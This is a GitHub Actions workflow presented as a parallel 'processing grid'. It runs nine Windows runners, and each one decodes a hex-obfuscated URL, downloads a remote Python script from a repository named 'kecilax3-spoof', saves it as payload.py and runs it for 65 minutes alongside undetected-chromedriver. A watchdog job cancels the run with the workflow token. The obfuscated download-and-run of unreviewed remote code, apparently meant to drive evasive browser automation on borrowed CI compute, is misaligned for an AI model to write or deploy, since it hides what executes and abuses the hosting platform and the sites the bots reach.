name: Orchestrated Async Processing Grid

on:
  workflow_dispatch:

concurrency:
  group: grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  watchdog:
    name: "Deadline Enforcer"
    runs-on: windows-2022
    timeout-minutes: 75
    steps:
      - name: Deploy Countdown
        shell: pwsh
        run: |
          Write-Host "[ENFORCER] Deadline enforcer deployed. Auto-cancel scheduled at 65 minutes."
          Write-Host "[ENFORCER] Run identifier: ${{ github.run_id }}"
          
          Start-Sleep -Seconds 3900
          
          Write-Host "[ENFORCER] Deadline reached. Triggering cancellation..."
          
          curl.exe -sS -X POST `
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" `
            -H "Accept: application/vnd.github+json" `
            -H "X-GitHub-Api-Version: 2022-11-28" `
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          Write-Host "[ENFORCER] Cancellation signal sent."

  parallel-workers:
    name: "GridNode-${{ matrix.slot }}"
    runs-on: windows-2022
    timeout-minutes: 70

    strategy:
      fail-fast: false
      matrix:
        slot: [10, 20, 30, 40, 50, 60, 70, 80, 90]

    steps:
      - name: Prepare Runtime
        shell: pwsh
        run: |
          Write-Host "[PREP] Preparing runtime for GridNode-${{ matrix.slot }}..."
          python --version
          python -m pip --version

      - name: Download Payload
        shell: pwsh
        run: |
          Write-Host "[DOWNLOAD] Fetching payload..."
          $hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4d794d757368726f6f6d32322f6b6563696c6178332d73706f6f662f6d61737465722f73746172742e7079"
          [byte[]]$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
            [Convert]::ToByte($hex.Substring($i, 2), 16)
          }
          $payloadUrl = [System.Text.Encoding]::UTF8.GetString($bytes)
          curl.exe -sL $payloadUrl -o payload.py
          Write-Host "[DOWNLOAD] Payload ready."

      - name: Install Libraries
        shell: pwsh
        run: |
          Write-Host "[LIBS] Installing dependencies..."
          python -m pip install -q undetected-chromedriver selenium requests

      - name: Run Timed Execution
        shell: pwsh
        run: |
          Write-Host ">> Starting GridNode-${{ matrix.slot }}..."
          $proc = Start-Process -FilePath python -ArgumentList "payload.py" -PassThru
          $taskPid = $proc.Id
          
          Write-Host ">> Execution window: 65 minutes (3900 seconds)."
          
          Start-Sleep -Seconds 3900
          
          $running = Get-Process -Id $taskPid -ErrorAction SilentlyContinue
          if ($running) {
            Write-Host ">> Time limit exceeded. Terminating task..."
            Stop-Process -Id $taskPid -Force
            Write-Host ">> Task terminated."
          } else {
            Write-Host ">> Task completed normally."
          }
